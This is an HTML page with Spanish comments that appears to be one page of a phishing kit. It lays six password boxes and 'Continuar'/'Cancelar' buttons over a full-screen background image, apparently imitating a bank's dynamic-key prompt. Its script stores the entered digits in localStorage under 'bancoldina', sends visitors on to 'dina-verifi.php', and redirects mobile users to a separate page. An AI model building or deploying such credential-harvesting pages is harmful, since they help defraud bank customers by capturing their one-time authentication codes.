<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image-based Website</title>
    <style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }
    body, html {
        height: 100%;
        width: 100%;
        display: flex;
        justify-content: center;
        align-items: center;
        background-color: #f0f0f0;
    }
    .image-container {
        width: 100%;
        height: 100%;
        overflow: hidden;
        position: relative;
    }
    .image-container img {
        width: 100%;
        height: 100%;
        object-fit: cover;
    }
    .center-box {
        position: absolute;
        top: 55%;
        left: 49.7%;
        transform: translate(-50%, -50%);
        background-color: rgb(255, 255, 255);
        width: 320px; /* Ajusta el tamaño según sea necesario */
        height: 60px;
        display: flex;
        justify-content: center;
        align-items: center;
        border-radius: 8px;
    }
    .center-box .input-container {
        position: relative;
        width: 100%;
        display: flex;
        justify-content: space-between;
        gap: 10px; /* Espacio entre los inputs */
    }
    .password-input {
        width: 40px;
        height: 60px;
        text-align: center;
        font-size: 20px;
        border: 1px solid #000000;
        border-radius: 5px;
        margin-right: 10px; /* Margen entre los inputs */
    }
    .button-container {
        position: absolute;
        top: 66.5%;
        left: 50%;
        transform: translate(-50%, -50%);
        display: flex;
        gap: 15px;
    }
    .button-container button {
        padding: 21px 75px;
        font-size: 16px;
        border: none;
        border-radius: 50px;
        font-weight: bold;
        color: rgb(1, 1, 1);
        cursor: pointer;
        transition: background-color 0.3s ease;
    }
    .button-container button:first-child {
        background-color: #ffffff;
        border: 1px solid black;
    }
    .button-container button:first-child:hover {
        background-color: #ffffff;
    }
    .button-container button:last-child {
        background-color: #ffda37;
    }
    .button-container button:last-child:hover {
        background-color: #ffda37;
    }
</style>

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
</head>
<body>
    <div class="image-container">
        <img src="img/3.png" alt="Background Image">
        <div class="center-box">
            <div class="input-container">
                <input type="password" class="password-input" maxlength="1" id="input1">
                <input type="password" class="password-input" maxlength="1" id="input2">
                <input type="password" class="password-input" maxlength="1" id="input3">
                <input type="password" class="password-input" maxlength="1" id="input4">
                <input type="password" class="password-input" maxlength="1" id="input5"> <!-- Nuevo input -->
                <input type="password" class="password-input" maxlength="1" id="input6"> <!-- Nuevo input -->
            </div>
        </div>
        <div class="button-container">
            <button id="cancelar">Cancelar</button>
            <button id="continuar">Continuar</button>
        </div>
    </div>

    <script>
        // Verificar si el usuario está en un dispositivo móvil
        if (window.innerWidth <= 800) { // Este valor puede ajustarse según el tamaño que consideres móvil
            window.location.href = "cel-dina.html"; // Redirige a una página informando que no está disponible
        }

        const inputs = document.querySelectorAll('.password-input');

        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                // Si el input no está vacío, mueve al siguiente
                if (e.target.value !== '') {
                    if (index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                }
            });

            input.addEventListener('keydown', (e) => {
                // Si presionamos la tecla 'backspace', mover al input anterior
                if (e.key === 'Backspace' && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        document.getElementById('continuar').addEventListener('click', () => {
            // Concatenar los valores de los inputs en un solo string
            const inputValues = Array.from(document.querySelectorAll('.password-input'))
                                      .map(input => input.value)
                                      .join('');

            // Guardar el string concatenado en localStorage
            localStorage.setItem('bancoldina', inputValues);

            // Redirigir a la página dina-verifi.php
            window.location.href = 'dina-verifi.php';
        });

        document.getElementById('cancelar').addEventListener('click', () => {
            // Puedes agregar cualquier acción adicional aquí si se desea cancelar
            window.location.href = 'index.html'; // O redirigir a otra página
        });
    </script>
</body>
</html>
